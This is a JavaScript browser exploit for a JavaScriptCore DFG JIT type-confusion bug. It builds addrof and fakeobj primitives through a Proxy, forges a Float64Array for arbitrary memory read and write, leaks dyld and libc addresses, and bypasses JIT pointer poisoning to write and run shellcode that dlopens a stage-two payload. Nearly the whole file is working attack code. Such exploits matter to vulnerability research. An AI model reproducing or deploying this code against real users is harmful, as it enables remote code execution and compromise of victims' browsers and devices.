// Must create this indexing type transition first,
// otherwise the JIT will deoptimize later.
var a = [13.37, 13.37];
a[0] = {};

var referenceFloat64Array = new Float64Array(0x1000);

//
// Bug: the DFG JIT does not take into account that, through the use of a
// Proxy, it is possible to run arbitrary JS code during the execution of a
// CreateThis operation. This makes it possible to change the structure of e.g.
// an argument without causing a bailout, leading to a type confusion.
//

//
// addrof primitive
//
function setupAddrof() {
    function InfoLeaker(a) {
        this.address = a[0];
    }

    var trigger = false;
    var leakme = null;
    var arg = null;

    var handler = {
        get(target, propname) {
            if (trigger)
                arg[0] = leakme;
            return target[propname];
        },
    };
    var InfoLeakerProxy = new Proxy(InfoLeaker, handler);

    for (var i = 0; i < 100000; i++) {
        new InfoLeakerProxy([1.1, 2.2, 3.3]);
    }

    trigger = true;

    return function(obj) {
        leakme = obj;
        arg = [1.1, 1.1];
        var o = new InfoLeakerProxy(arg);
        return o.address;
    };
}

//
// fakeobj primitive
//
function setupFakeobj() {
    function ObjFaker(a, address) {
        a[0] = address;
    }

    var trigger = false;
    var arg = null;

    var handler = {
        get(target, propname) {
            if (trigger)
                arg[0] = {};
            return target[propname];
        },
    };
    var ObjFakerProxy = new Proxy(ObjFaker, handler);

    for (var i = 0; i < 100000; i++) {
        new ObjFakerProxy([1.1, 2.2, 3.3], 13.37);
    }

    trigger = true;

    return function(address) {
        arg = [1.1, 1.1];
        var o = new ObjFakerProxy(arg, address);
        return arg[0];
    };
}

function makeJITCompiledFunction() {
    // Some code to avoid inlining...
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }

    // Force JIT compilation.
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    return target;
}

function pwn() {
    // Spray Float64Array structures so that structure ID 0x1000 will
    // be a Float64Array with very high probability
    var structs = [];
    for (var i = 0; i < 0x1000; i++) {
        var a = new Float64Array(1);
        a['prop' + i] = 1337;
        structs.push(a);
    }

    // Setup exploit primitives
    var addrofOnce = setupAddrof();
    var fakeobjOnce = setupFakeobj();

    // (Optional) Spray stuff to keep the background GC busy and increase reliability even further
    /*
    var stuff = [];
    for (var i = 0; i < 0x100000; i++) {
        stuff.push({foo: i});
    }
    */

    var float64MemView = new Float64Array(0x200);
    var uint8MemView = new Uint8Array(0x1000);

    // Setup container to host the fake Float64Array
    var jsCellHeader = new Int64([
        00, 0x10, 00, 00,     // m_structureID
        0x0,                  // m_indexingType
        0x2b,                 // m_type
        0x08,                 // m_flags
        0x1                   // m_cellState
    ]);

    var container = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: null,
        vector: float64MemView,
        length: (new Int64('0x0001000000001337')).asJSValue(),
        mode: {},       // an empty object, we'll need that later
    };

    // Leak address and inject fake object
    // RawAddr == address in float64 form
    var containerRawAddr = addrofOnce(container);
    var fakeArrayAddr = Add(Int64.fromDouble(containerRawAddr), 16);
    print("[+] Fake Float64Array @ " + fakeArrayAddr);

    ///
    /// BEGIN CRITICAL SECTION
    ///
    /// Objects are corrupted, a GC would now crash the process.
    /// We'll try to repair everything as quickly as possible and with a minimal amount of memory allocations.
    ///
    var driver = fakeobjOnce(fakeArrayAddr.asDouble());
    while (!(driver instanceof Float64Array)) {
        jsCellHeader.assignAdd(jsCellHeader, Int64.One);
        container.jsCellHeader = jsCellHeader.asJSValue();
    }

    // Get some addresses that we'll need to repair our objects. We'll abuse the .mode
    // property of the container to leak addresses.
    driver[2] = containerRawAddr;
    var emptyObjectRawAddr = float64MemView[6];
    container.mode = referenceFloat64Array;
    var referenceFloat64ArrayRawAddr = float64MemView[6];

    // Fixup the JSCell header of the container to make it look like an empty object.
    // By default, JSObjects have an inline capacity of 6, enough to hold the fake Float64Array.
    driver[2] = emptyObjectRawAddr;
    var header = float64MemView[0];
    driver[2] = containerRawAddr;
    float64MemView[0] = header;

    // Copy the JSCell header from an existing Float64Array and set the butterfly to zero.
    // Also set the mode: make it look like an OversizeTypedArray for easy GC survival
    // (see JSGenericTypedArrayView<Adaptor>::visitChildren).
    driver[2] = referenceFloat64ArrayRawAddr;
    var header = float64MemView[0];
    var length = float64MemView[3];
    var mode = float64MemView[4];
    driver[2] = containerRawAddr;
    float64MemView[2] = header;
    float64MemView[3] = 0;
    float64MemView[5] = length;
    float64MemView[6] = mode;

    // Root the container object so it isn't garbage collected.
    // This will allocate a butterfly for the fake object and store a reference to the container there.
    // The fake array itself is rooted by the memory object (closures).
    driver.container = container;

    ///
    /// END CRITICAL SECTION
    ///
    /// Objects are repaired, we will now survive a GC
    ///
    if (typeof(gc) !== 'undefined')
        gc();

    memory = {
        read: function(addr, length) {
            driver[2] = memory.addrof(uint8MemView).asDouble();
            float64MemView[2] = addr.asDouble();
            var a = new Array(length);
            for (var i = 0; i < length; i++)
                a[i] = uint8MemView[i];
            return a;
        },

        write: function(addr, data) {
            driver[2] = memory.addrof(uint8MemView).asDouble();
            float64MemView[2] = addr.asDouble();
            for (var i = 0; i < data.length; i++)
                uint8MemView[i] = data[i];
        },

        read8: function(addr) {
            driver[2] = addr.asDouble();
            return Int64.fromDouble(float64MemView[0]);
        },

        write8: function(addr, value) {
            driver[2] = addr.asDouble();
            float64MemView[0] = value.asDouble();
        },

        addrof: function(obj) {
            float64MemView.leakme = obj;
            var butterfly = Int64.fromDouble(driver[1]);
            return memory.read8(Sub(butterfly, 0x10));
        },
    };

    print("[+] Got stable memory read/write!");

    // Find binary base
    var funcAddr = memory.addrof(Math.sin);
    var executableAddr = memory.read8(Add(funcAddr, 24));
    var codeAddr = memory.read8(Add(executableAddr, 24));
    var vtabAddr = memory.read8(codeAddr);
    var jscBase = Sub(vtabAddr, JSC_VTAB_OFFSET);
    print("[*] JavaScriptCore.dylib @ " + jscBase);

    var dyldStubLoaderAddr = memory.read8(jscBase);
    var dyldBase = Sub(dyldStubLoaderAddr, DYLD_STUB_LOADER_OFFSET);
    var strlenAddr = memory.read8(Add(jscBase, STRLEN_GOT_OFFSET));
    var libCBase = Sub(strlenAddr, STRLEN_OFFSET);
    print("[*] dyld.dylib @ " + dyldBase);
    print("[*] libsystem_c.dylib @ " + libCBase);

    var confstrAddr = Add(libCBase, CONFSTR_OFFSET);
    print("[*] confstr @ " + confstrAddr);
    var dlopenAddr = Add(dyldBase, DLOPEN_OFFSET);
    print("[*] dlopen @ " + dlopenAddr);

    // Patching shellcode
    var stage2Addr = memory.addrof(stage2);
    stage2Addr = memory.read8(Add(stage2Addr, 16));
    print("[*] Stage 2 payload @ " + stage2Addr);

    stage1.replace(new Int64("0x4141414141414141"), confstrAddr);
    stage1.replace(new Int64("0x4242424242424242"), stage2Addr);
    stage1.replace(new Int64("0x4343434343434343"), new Int64(stage2.length));
    stage1.replace(new Int64("0x4444444444444444"), dlopenAddr);
    print("[+] Shellcode patched");

    // Leak JITCode pointer poison value
    var poison_addr = Add(jscBase, 305152);
    print("[*] Poison value @ " + poison_addr);
    var poison = memory.read8(poison_addr);
    print("[*] Poison value: " + poison);

    // Shellcode
    var func = makeJITCompiledFunction();
    var funcAddr = memory.addrof(func);
    print("[+] Shellcode function object @ " + funcAddr);
    var executableAddr = memory.read8(Add(funcAddr, 24));
    print("[+] Executable instance @ " + executableAddr);
    var jitCodeAddr = memory.read8(Add(executableAddr, 24));
    print("[+] JITCode instance @ " + jitCodeAddr);

    var codeAddrPoisoned = memory.read8(Add(jitCodeAddr, 32));
    var codeAddr = Xor(codeAddrPoisoned, poison);
    print("[+] RWX memory @ " + codeAddr.toString());
    print("[+] Writing shellcode...");
    var origCode = memory.read(codeAddr, stage1.length);
    memory.write(codeAddr, stage1);

    print("[!] Jumping into shellcode...");
    var res = func();
    if (res === 0)
        print("[+] Shellcode executed sucessfully!");
    else
        print("[-] Shellcode failed to execute: error " + res);

    memory.write(codeAddr, origCode);
    print("[*] Restored previous JIT code");

    print("[+] We are done here, continuing WebContent process as if nothing happened =)");
    if (typeof(gc) !== 'undefined')
        gc();
}

ready.then(function() {
    try {
        pwn();
    } catch (e) {
        print("[-] Exception caught: " + e);
    }
}).catch(function(err) {
    print("[-] Initializatin failed");
});
